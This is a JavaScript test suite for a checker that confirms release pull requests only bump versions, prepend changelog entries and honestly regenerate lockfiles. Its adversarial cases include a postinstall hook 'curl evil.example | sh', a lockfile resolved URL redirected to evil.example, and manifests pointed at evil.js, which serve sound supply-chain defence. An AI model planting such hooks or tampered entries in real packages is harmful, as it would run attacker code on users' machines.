import assert from "node:assert/strict";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import test from "node:test";
import {
  classifyReleasePrFile,
  evaluateReleasePrFootprint,
  isChangelogPurePrepend,
  isPackageManifestVersionOnlyChange,
  verifyLockfileRegeneration,
} from "./release-pr-footprint.mjs";

// ---------------------------------------------------------------- isPackageManifestVersionOnlyChange

test("isPackageManifestVersionOnlyChange: a pure version bump passes", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT", dependencies: { foo: "^1.0.0" } });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", license: "MIT", dependencies: { foo: "^1.0.0" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), true);
});

test("isPackageManifestVersionOnlyChange: unaffected by key order", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", dependencies: { foo: "^1.0.0", bar: "^2.0.0" } });
  const head = JSON.stringify({ dependencies: { bar: "^2.0.0", foo: "^1.0.0" }, version: "1.0.1", name: "@x/alpha" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), true);
});

// ADVERSARIAL: a dependency added
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a dependency added alongside the version bump fails", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", dependencies: { foo: "^1.0.0" } });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", dependencies: { foo: "^1.0.0", evil: "^9.9.9" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

// ADVERSARIAL: a postinstall script added
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a postinstall script added alongside the version bump fails", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", scripts: { postinstall: "curl evil.example | sh" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

// ADVERSARIAL: a non-version manifest edit (no bump at all, e.g. "bin" changed)
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a non-version field edit with NO version change fails (nothing to justify it)", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", bin: { alpha: "./bin/alpha.js" } });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.0", bin: { alpha: "./bin/evil.js" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: bin/exports changed alongside a real version bump still fails", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", exports: "./index.js" });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", exports: "./evil.js" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("isPackageManifestVersionOnlyChange: malformed JSON on either side fails rather than throwing", () => {
  assert.equal(isPackageManifestVersionOnlyChange("not json", '{"version":"1.0.1"}'), false);
  assert.equal(isPackageManifestVersionOnlyChange('{"version":"1.0.0"}', "not json"), false);
});

test("isPackageManifestVersionOnlyChange: no version change at all fails even with identical rest", () => {
  const text = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
  assert.equal(isPackageManifestVersionOnlyChange(text, text), false);
});

// ---------------------------------------------------------------- isChangelogPurePrepend

test("isChangelogPurePrepend: a clean prepend above the first entry passes", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPurePrepend(base, head), true);
});

test("isChangelogPurePrepend: a brand-new file (no base) passes when it opens with a heading (after any title text)", () => {
  const head = "# Changelog\n\n## 0.1.0 - 2026-09-22\n\n- First release.\n";
  assert.equal(isChangelogPurePrepend(null, head), true);
});

test("isChangelogPurePrepend: no growth at all fails", () => {
  const text = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPurePrepend(text, text), false);
  assert.equal(isChangelogPurePrepend(text, text.slice(0, -1)), false);
});

// ADVERSARIAL: an old CHANGELOG entry rewritten
test("ADVERSARIAL isChangelogPurePrepend: rewriting an OLD entry alongside a legitimate new one fails", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Rewritten history, not the original bullet.\n";
  assert.equal(isChangelogPurePrepend(base, head), false);
});

test("ADVERSARIAL isChangelogPurePrepend: deleting an old entry while adding a new one fails", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n\n## 0.9.0\n\n- Pre-release.\n";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n"; // dropped the 0.9.0 entry
  assert.equal(isChangelogPurePrepend(base, head), false);
});

test("ADVERSARIAL isChangelogPurePrepend: inserted text that is not a heading fails", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\nNot a version heading at all.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPurePrepend(base, head), false);
});

test("ADVERSARIAL isChangelogPurePrepend: text appended at the END (not prepended) still structurally passes the pure-insertion test, but classifyReleasePrFile's caller relies on this only alongside a real package.json bump", () => {
  // Documents the boundary of what this function alone checks (pure insertion + a "## " opening the insertion) --
  // it does not independently enforce "at the top" beyond requiring the insertion to itself be a heading.
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = base + "## 1.0.1\n\n- Also fine structurally.\n";
  assert.equal(isChangelogPurePrepend(base, head), true);
});

// ---------------------------------------------------------------- classifyReleasePrFile

test("classifyReleasePrFile: a legitimate package.json bump passes", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1" });
  assert.equal(classifyReleasePrFile({ path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head }), true);
});

test("classifyReleasePrFile: package.json with the wrong git status (added/removed) fails even with valid content shape", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1" });
  assert.equal(classifyReleasePrFile({ path: "packages/alpha/package.json", status: "added", baseContent: base, headContent: head }), false);
});

test("classifyReleasePrFile: package-lock.json passes on path+status alone (content verified separately)", () => {
  assert.equal(classifyReleasePrFile({ path: "package-lock.json", status: "modified", baseContent: "old", headContent: "new" }), true);
  assert.equal(classifyReleasePrFile({ path: "package-lock.json", status: "added" }), false);
});

// ADVERSARIAL: a new changeset smuggled in
test("ADVERSARIAL classifyReleasePrFile: a NEW (added) changeset file fails -- only a deletion is legal", () => {
  assert.equal(classifyReleasePrFile({ path: ".changesets/sneaky.md", status: "added", headContent: "---\nalpha: major\n---\n\nSmuggled.\n" }), false);
});

test("classifyReleasePrFile: a deleted (consumed) changeset passes", () => {
  assert.equal(classifyReleasePrFile({ path: ".changesets/alpha-fix.md", status: "removed" }), true);
});

test("classifyReleasePrFile: an unrelated file always fails, regardless of status", () => {
  assert.equal(classifyReleasePrFile({ path: "packages/alpha/src/index.ts", status: "modified" }), false);
  assert.equal(classifyReleasePrFile({ path: ".github/workflows/ci.yml", status: "modified" }), false);
  assert.equal(classifyReleasePrFile({ path: "README.md", status: "modified" }), false);
});

// ---------------------------------------------------------------- evaluateReleasePrFootprint

function manifestPair(version1, version2, extra = {}) {
  return [JSON.stringify({ name: "@x/alpha", version: version1, ...extra }), JSON.stringify({ name: "@x/alpha", version: version2, ...extra })];
}

test("evaluateReleasePrFootprint: a clean release PR (bump + changelog + lockfile verified + deleted changeset) passes", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: "packages/alpha/CHANGELOG.md", status: "modified", baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n", headContent: "# Changelog\n\n## 1.0.1\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n" },
      { path: "package-lock.json", status: "modified" },
      { path: ".changesets/alpha-fix.md", status: "removed" },
    ],
    lockfileVerified: true,
  });
  assert.equal(result.ok, true);
});

test("evaluateReleasePrFootprint: fails closed on an empty file list", () => {
  assert.equal(evaluateReleasePrFootprint({ files: [] }).ok, false);
});

test("evaluateReleasePrFootprint: fails when no package.json is touched at all", () => {
  const result = evaluateReleasePrFootprint({ files: [{ path: ".changesets/alpha-fix.md", status: "removed" }] });
  assert.equal(result.ok, false);
  assert.match(result.reason, /no packages/);
});

test("evaluateReleasePrFootprint: a lockfile change present but NOT verified fails closed", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: "package-lock.json", status: "modified" },
    ],
    lockfileVerified: false,
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /regeneration could not be verified/);
});

test("evaluateReleasePrFootprint: a lockfile change present with lockfileVerified left at its null default fails closed too", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: "package-lock.json", status: "modified" },
    ],
  });
  assert.equal(result.ok, false);
});

test("evaluateReleasePrFootprint: no lockfile in the diff at all is fine -- nothing to verify", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({ files: [{ path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head }] });
  assert.equal(result.ok, true);
});

test("evaluateReleasePrFootprint: ANY single non-conforming file fails the whole PR, even alongside an otherwise-perfect bump", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: "packages/alpha/src/index.ts", status: "modified" }, // the intrusion
    ],
  });
  assert.equal(result.ok, false);
});

// ---------------------------------------------------------------- verifyLockfileRegeneration

test("verifyLockfileRegeneration: byte-identical regeneration passes", () => {
  const expected = '{"name":"root","lockfileVersion":3}\n';
  const result = verifyLockfileRegeneration({
    rootManifestText: '{"name":"root","workspaces":["packages/*"]}',
    packageManifestTexts: { "packages/alpha/package.json": '{"name":"@x/alpha","version":"1.0.1"}' },
    expectedLockfileText: expected,
    runNpmInstall: (root) => {
      // Fake "npm install --package-lock-only": just write the canned expected lockfile.
      writeFileSync(join(root, "package-lock.json"), expected);
    },
  });
  assert.equal(result, true);
});

// ADVERSARIAL: a lockfile resolved-URL or integrity tamper
test("ADVERSARIAL verifyLockfileRegeneration: a tampered resolved/integrity field fails, even with everything else identical", () => {
  const legit = '{"name":"root","lockfileVersion":3,"packages":{"node_modules/foo":{"resolved":"https://registry.npmjs.org/foo/-/foo-1.0.0.tgz","integrity":"sha512-real"}}}\n';
  const tampered = '{"name":"root","lockfileVersion":3,"packages":{"node_modules/foo":{"resolved":"https://evil.example/foo.tgz","integrity":"sha512-real"}}}\n';
  const result = verifyLockfileRegeneration({
    rootManifestText: '{"name":"root","workspaces":["packages/*"]}',
    packageManifestTexts: {},
    expectedLockfileText: tampered, // what the PR actually shipped
    runNpmInstall: (root) => {
      writeFileSync(join(root, "package-lock.json"), legit); // what a clean regeneration produces
    },
  });
  assert.equal(result, false);
});

test("verifyLockfileRegeneration: npm itself failing (network, missing binary, anything) fails closed rather than throwing", () => {
  const result = verifyLockfileRegeneration({
    rootManifestText: '{"name":"root"}',
    packageManifestTexts: {},
    expectedLockfileText: "anything",
    runNpmInstall: () => {
      throw new Error("simulated network failure");
    },
  });
  assert.equal(result, false);
});

test("verifyLockfileRegeneration: npm running but never producing a lockfile fails closed", () => {
  const result = verifyLockfileRegeneration({
    rootManifestText: '{"name":"root"}',
    packageManifestTexts: {},
    expectedLockfileText: "anything",
    runNpmInstall: () => {
      /* does nothing -- no package-lock.json written */
    },
  });
  assert.equal(result, false);
});
